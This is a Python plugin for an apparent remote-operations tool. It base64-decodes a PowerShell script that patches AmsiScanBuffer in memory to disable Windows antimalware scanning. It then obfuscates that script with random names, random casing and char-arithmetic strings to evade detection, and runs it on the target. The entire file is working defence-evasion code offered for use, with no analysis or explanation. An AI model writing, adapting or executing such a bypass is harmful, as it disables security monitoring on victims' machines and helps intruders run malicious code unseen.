import json
import re
import base64
from remoteops.commands.plugin_api import PluginError
import random
import string

def random_string(length):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for _ in range(length))

def replace_placeholder_var(template, var_placeholder):
    random_length = random.randint(5, 21)
    var_name = random_string(random_length)
    return replace_placeholder(template, var_placeholder, var_name)

def replace_placeholder(template, placeholder, str_value):
    return template.replace(placeholder, str_value)

WORDS_RANDOM_CASE = ['[Runtime.InteropServices.Marshal]',
  'System.Runtime.InteropServices.Marshal',
  'System.Reflection.Emit.AssemblyBuilderAccess',
  'System.Reflection.CallingConventions',
  'System.Reflection.AssemblyName',
  'System.MulticastDelegate',
  'GetDelegateForFunctionPointer',
  'Import-PowerShellDataFile',
  'ImportSystemModules',
  'New-TemporaryFile',
  '.MakeByRefType',
  '.CreateType',
  '.DefineConstructor',
  '.DefineMethod',
  '.DefineDynamicModule',
  'function ',
  'WriteByte',
  '[Ref]',
  'Assembly.GetType',
  'GetField',
  '[System.Net.WebUtility]',
  'HtmlDecode',
  'Reflection.BindingFlags',
  'NonPublic',
  'Static',
  'GetValue',
  'ForEach-Object',
  'Where-Object',
  'Select-Object',
  '.name',
  'showmethods',
  'function:',
  '.CommandType',
  '-contains',
  '-notmatch',
  '-like',
  '-notlike',
  '-notcontains',
  '-and',
  'ls ',
  '$global',
  '-Property'] 

def rand_casing_keywords(template):
    result = template
    
    for w in WORDS_RANDOM_CASE:
        # Convert to string just in case, mirroring Ruby's .to_s
        word_str = str(w)
        
        # Locally randomizes casing for the current keyword
        randomized_word = ''.join(random.choice([c.upper(), c.lower()]) for c in word_str)
        
        # Replace all occurrences in the string
        result = result.replace(word_str, randomized_word)
        
    return result

def replace_with_string_scan(template):
    result = template
    a_mark = "<><"
    
    try:
        # Python's .index() raises a ValueError if not found, unlike Ruby's nil
        begin_i = template.index(a_mark)
    except ValueError:
        begin_i = -1
        
    last_i = 0
    
    if begin_i >= 0:
        try:
            next_i = template.index(a_mark, begin_i + 1)
        except ValueError:
            next_i = -1
            
        while next_i != -1 and begin_i != -1 and next_i > begin_i and next_i + 2 <= len(template):
            next_i += 2
            last_i = next_i
            
            # Note: Because Python strings are immutable, replace_string_scan_part 
            # must return the new string, and we re-assign it to result.
            result = replace_string_scan_part(result, begin_i, next_i, a_mark)
            
            try:
                begin_i = template.index(a_mark, next_i)
            except ValueError:
                begin_i = -1
                
            if begin_i >= 0:
                try:
                    next_i = template.index(a_mark, begin_i + 1)
                except ValueError:
                    next_i = -1
            else:
                next_i = -1
                
    return result

def get_char_expression(the_char):
    rand_val = random.randint(0, 9999) + random.randint(0, 99)
    val = ord(the_char) + rand_val
    
    # Randomly converts 'char' to uppercase ('CHAR'), lowercase ('char'), 
    # or mixed case styles like 'Char' or 'cHaR'
    char_val = ''.join(random.choice([c.upper(), c.lower()]) for c in 'char')

    return f"[{char_val}]({val}-{rand_val})"


def get_byte_expression(the_char):
    # Ruby's (30..120) range selection maps to Python's inclusive randint
    rand_val = random.randint(30, 120)
    val = ord(the_char) + rand_val
    
    # Locally randomizes casing for 'char' and 'byte'
    char_val = ''.join(random.choice([c.upper(), c.lower()]) for c in 'char')
    byte_val = ''.join(random.choice([c.upper(), c.lower()]) for c in 'byte')

    # val.to_s(16) in Ruby converts the integer to a hex string. 
    # Python's f"{val:x}" formats the number as hex without the '0x' prefix.
    return f"[{char_val}]([{byte_val}] 0x{val:x}-0x{rand_val:x})"

def get_char_raw(the_char):
    # Directly returns the character wrapped in escaped double quotes
    return f'"{the_char}"'


def generate_random_type_string(to_randomize):
    result = ''
    
    for c in to_randomize:
        # Replaces Ruby's (rand 2) == 0 nested ternary logic
        if random.randint(0, 1) == 0:
            if random.randint(0, 1) == 0:
                chosen_expr = get_char_expression(c)
            else:
                chosen_expr = get_byte_expression(c)
        else:
            chosen_expr = get_char_expression(c)
            
        result += f"+{chosen_expr}"
        
    # Ruby's [1..-1] slices off the leading "+" sign. 
    # Python slices are [start:end], so [1:] strips the first character.
    return result[1:]


def replace_string_scan_part(template, begin_i, end_i, mark):
    # Ruby ranges [begin_i..end_i] are inclusive. 
    # Python slices are exclusive at the end, so we use end_i + 1.
    to_replace = template[begin_i:end_i + 1]
    
    # Remove the markers from the substring
    to_place = to_replace.replace(mark, "")
    
    first_t = False
    result = ""
    
    # Split by pipe and process each word
    for word in to_place.split("|"):
        if not first_t:
            first_t = True
            result += generate_random_type_string(word)
        else:
            result += '+"|"++' + generate_random_type_string(word)
            
    # Python strings cannot be mutated in place. 
    # We replace all occurrences and return the new string text.
    return template.replace(to_replace, result)


def replace_func_var_name(template, function_name, replace_with):
    if len(replace_with) == 0:
        random_length = random.randint(15, 32)
        replace_with = random_string(random_length)
        
    a_mark = ">><"
    func_placeholder = f"{a_mark}{function_name}{a_mark}"
    return replace_placeholder(template, func_placeholder, replace_with)


def process_template(initial_template):
    result = initial_template

    # Python's range(1, 3) yields 1, 2 (matching Ruby's 1..2)
    for i in range(1, 3):
        func_name = f"Get-{random_string(random.randint(7, 17))}"
        result = replace_func_var_name(result, f"FUNCTION{i}", func_name)

    # Python's range(1, 13) yields 1 through 12 (matching Ruby's 1..12)
    for i in range(1, 13):
        var_name = f"${random_string(random.randint(7, 17))}"
        result = replace_func_var_name(result, f"VAR{i}", var_name)

    # Final structural replacement passes
    result = replace_with_string_scan(result)
    result = rand_casing_keywords(result)
    
    return result

def run(ctx, args):
    template = 'ZnVuY3Rpb24gPj48RlVOQ1RJT04xPj48IHsKICAgIFBhcmFtICg+PjxWQVIxPj48LCA+PjxWQVIyPj48KQogICAgPj48VkFSMz4+PCA9IChbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbi5HZXRBc3NlbWJsaWVzKCkgfAogICAgV2hlcmUtT2JqZWN0IHsgCiAgICAgICAgJF8uR2xvYmFsQXNzZW1ibHlDYWNoZSAtQW5kICRfLkxvY2F0aW9uLlNwbGl0KCIiKzw+PFw8PjwrIiIpWy0xXS5FcXVhbHMoIiIrPD48U3lzdGVtLmRsbDw+PCsiIikKICAgICB9KS5HZXRUeXBlKCJNaWNyb3NvZnQuIis8PjxXaW4zMi5Vbjw+PCsic2FmZU5hdGl2ZU1ldGhvZHMiKQogICAgPj48VkFSND4+PD1AKCkKICAgID4+PFZBUjM+PjwuR2V0TWV0aG9kcygpIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgIElmKCRfLk5hbWUgLWxpa2UgIkdlKlAqb2MqIis8PjxkZHJlczw+PCsicyIpIHsKICAgICAgICAgICAgPj48VkFSND4+PCs9JF8KICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gPj48VkFSND4+PFswXS5JbnZva2UoJG51bGwsIEAoKD4+PFZBUjM+PjwuR2V0TWV0aG9kKCIiKzw+PEdldE08PjwrIm9kdWwiKzw+PGVIYW48PjwrImRsZSIpKS5JbnZva2UoJG51bGwsIEAoPj48VkFSMT4+PCkpLCA+PjxWQVIyPj48KSkKfQojanVtcAoKZnVuY3Rpb24gPj48RlVOQ1RJT04yPj48IHsKICAgIFBhcmFtICgKICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXSBbVHlwZVtdXSA+PjxWQVI1Pj48LCBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSldIFtUeXBlXSA+PjxWQVI2Pj48ID0gW1ZvaWRdCiAgICApCiAgICA+PjxWQVIxMj4+PCA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkRlZmluZUR5bmFtaWNBc3NlbWJseSgKICAgICAgICAoTmV3LU9iamVjdCBTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseU5hbWUoIiIrPD48UmVmPD48KyJsZWMiKzw+PHRlZERlPD48KyJsZWdhdGUiKSksCiAgICAgICAgW1N5c3RlbS5SZWZsZWN0aW9uLkVtaXQuQXNzZW1ibHlCdWlsZGVyQWNjZXNzXTo6UnVuCiAgICApLkRlZmluZUR5bmFtaWNNb2R1bGUoCiAgICAgICAgIiIrPD48SW5NPD48KyJlbW8iKzw+PHJ5PD48KyJNb2R1bGUiLAogICAgICAgICRmYWxzZQogICAgKS5EZWZpbmVUeXBlKAogICAgICAgICQoIiIrPD48TXlEZWxlZ2F0ZVR5cGU8PjwrIiIpLAogICAgICAgICJDbGFzcywgUHVibGljLCBTZWFsZWQsIEFuc2lDbGFzcywgQXV0b0NsYXNzIiwKICAgICAgICBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXQogICAgKQoKICAgID4+PFZBUjEyPj48LkRlZmluZUNvbnN0cnVjdG9yKAogICAgICAgICJSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYyIsCiAgICAgICAgW1N5c3RlbS5SZWZsZWN0aW9uLkNhbGxpbmdDb252ZW50aW9uc106OlN0YW5kYXJkLCA+PjxWQVI1Pj48CiAgICApLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoIlJ1bnRpbWUsIE1hbmFnZWQiKQoKICAgID4+PFZBUjEyPj48LkRlZmluZU1ldGhvZCgKICAgICAgICAiSW52b2tlIiwKICAgICAgICAiUHVibGljLCBIaWRlQnlTaWcsIE5ld1Nsb3QsIFZpcnR1YWwiLAogICAgICAgID4+PFZBUjY+PjwsCiAgICAgICAgPj48VkFSNT4+PAogICAgKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCJSdW50aW1lLCBNYW5hZ2VkIikKICAgIAogICAgcmV0dXJuID4+PFZBUjEyPj48LkNyZWF0ZVR5cGUoKQp9CiNqdW1wCltJbnRQdHJdPj48VkFSNz4+PCA9ID4+PEZVTkNUSU9OMT4+PCAkKCIiKzw+PGFtc2kuZGxsPD48KyIiKSAkKCIiKzw+PEFtc2lTY2FuQnVmZmVyPD48KyIiKQojanVtcAo+PjxWQVI4Pj48ID0gMAojanVtcAo+PjxWQVI5Pj48PVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKAogICAgKD4+PEZVTkNUSU9OMT4+PCAkKCIiKzw+PGtlcm5lbDMyLmRsbDw+PCsiIikgVmlydHVhbFByb3RlY3QpLCAKICAgICg+PjxGVU5DVElPTjI+PjwgQChbSW50UHRyXSwgW1VJbnQzMl0sIFtVSW50MzJdLCBbVUludDMyXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pKQopCiNqdW1wCj4+PFZBUjEwPj48ID0gPj48VkFSOT4+PC5JbnZva2UoPj48VkFSNz4+PCwgMywgMHg0MCwgW3JlZl0+PjxWQVI4Pj48KQojanVtcAo+PjxWQVIxMT4+PCA9IFtCeXRlW11dICgweGI4LDB4MzQsMHgxMiwweDA3LDB4ODAsMHg2NiwweGI4LDB4MzIsMHgwMCwweGIwLDB4NTcsMHhjMykKI2p1bXAKPj48VkFSMTA+PjwgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KD4+PFZBUjExPj48LCAwLCA+PjxWQVI3Pj48LCAxMikKI2p1bXAKUmVtb3ZlLUl0ZW0gRnVuY3Rpb246Pj48RlVOQ1RJT04yPj48CiNqdW1wClJlbW92ZS1JdGVtIEZ1bmN0aW9uOj4+PEZVTkNUSU9OMT4+PA=='
    script = base64.b64decode(template).decode("utf-8-sig")
    am = process_template(script)
    result = ctx.powershell(am)
    return [{"Result":result}]
